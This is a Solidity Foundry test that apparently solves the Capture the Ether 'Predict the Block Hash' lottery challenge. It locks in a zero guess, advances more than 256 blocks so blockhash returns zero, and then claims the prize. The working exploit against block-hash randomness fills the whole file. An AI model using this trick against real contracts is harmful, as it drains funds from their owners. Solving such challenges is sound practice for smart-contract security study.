// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "../../src/lotteries/6.sol";
import "forge-std/console.sol";
contract PredictTheBlockHashChallengeTest is Test {
    PredictTheBlockHashChallenge target;
    address player;
    function setUp() public {
        target = new PredictTheBlockHashChallenge{value:1 ether}();
        player = vm.addr(1);
        vm.deal(player, 100 ether);
        vm.label(player, "player");
    }

    function testComplete() public {
        vm.startPrank(player);
        bytes32 answer = blockhash(block.number);
        target.lockInGuess{value: 1 ether}(answer);
        vm.roll(block.number + 258);    
        target.settle();
        assertTrue(target.isComplete());
    }
}